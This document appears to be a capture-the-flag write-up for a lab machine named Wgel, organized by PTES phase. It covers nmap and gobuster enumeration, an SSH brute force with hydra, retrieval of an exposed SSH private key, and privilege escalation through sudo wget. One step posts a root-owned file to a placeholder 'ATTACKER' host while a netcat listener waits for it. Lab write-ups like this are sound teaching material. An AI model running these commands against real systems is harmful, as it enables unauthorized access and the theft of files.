# Wgel

## Scope

Target IP: 10.65.137.127

---

# PTES Phase 1 - Information Gathering

## Nmap Enumeration

### Command

```bash
nmap -sV -p- 10.65.137.127
```

### Observation

Two services were exposed:

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 7.2p2 |
| 80   | Apache  | 2.4.18        |

### Hypothesis

The HTTP service represented the largest attack surface and could reveal credentials or sensitive information that might later allow SSH access.

### Result

```text
22/tcp open ssh
80/tcp open http
```

### Conclusion

The attack path became clearer. Further web enumeration was required.

---

# PTES Phase 2 - Web Enumeration

## Gobuster

### Command

```bash
gobuster dir -u http://10.65.137.127/ \
-w /usr/share/wordlists/dirb/common.txt \
-t 30
```

### Result

```text
/sitemap
```

### Analysis

The initial large wordlist produced no useful findings.

A smaller wordlist identified the `/sitemap` directory.

This demonstrates the importance of adjusting enumeration methodology rather than assuming the target is hardened.

---

## Source Code Review

### Command

```bash
curl http://10.65.137.127 | less
```

### Finding

```html
<!-- Jessie don't forget to update the website -->
```

### Analysis

The HTML comment disclosed a possible username:

```text
jessie
```

The existence of SSH on port 22 made this information particularly valuable.

---

# PTES Phase 3 - Credential Discovery

## SSH Bruteforce Attempt

### Command

```bash
hydra -l jessie -P rockyou.txt ssh://TARGET
```

### Result

No immediate success.

### Decision

Continue web enumeration while Hydra executes.

---

## Sensitive File Exposure

### Command

```bash
curl http://TARGET/sitemap/.ssh/id_rsa
```

### Result

A private SSH key was exposed through the web server.

### Analysis

The web server exposed sensitive authentication material.

This vulnerability immediately bypassed password authentication requirements.

### MITRE ATT&CK

T1552 - Unsecured Credentials

---

# PTES Phase 4 - Initial Access

## SSH Login

### Command

```bash
ssh -i id_rsa jessie@TARGET
```

### Result

Successful SSH authentication.

```text
whoami
jessie
```

### User Flag

User flag successfully obtained.

---

# PTES Phase 5 - Privilege Escalation

## Sudo Enumeration

The user jessie was permitted to execute:

```text
/usr/bin/wget
```

with elevated privileges.

### Analysis

GTFOBins documents abuse techniques for wget that allow arbitrary file exfiltration.

---

## Root Flag Exfiltration

### Attacker Machine

```bash
nc -lvnp 4444
```

### Target Machine

```bash
sudo /usr/bin/wget \
--post-file=/root/root_flag.txt \
http://ATTACKER:4444
```

### Result

The contents of the root flag were transmitted to the attack machine.

### Impact

Root-level information was successfully obtained.

### MITRE ATT&CK

T1548 - Abuse Elevation Control Mechanism

---

# Attack Chain

Nmap
↓
HTTP Enumeration
↓
HTML Comment
↓
Username Discovery
↓
Directory Enumeration
↓
Exposed SSH Private Key
↓
SSH Access
↓
Sudo Misconfiguration
↓
Root Flag Exfiltration
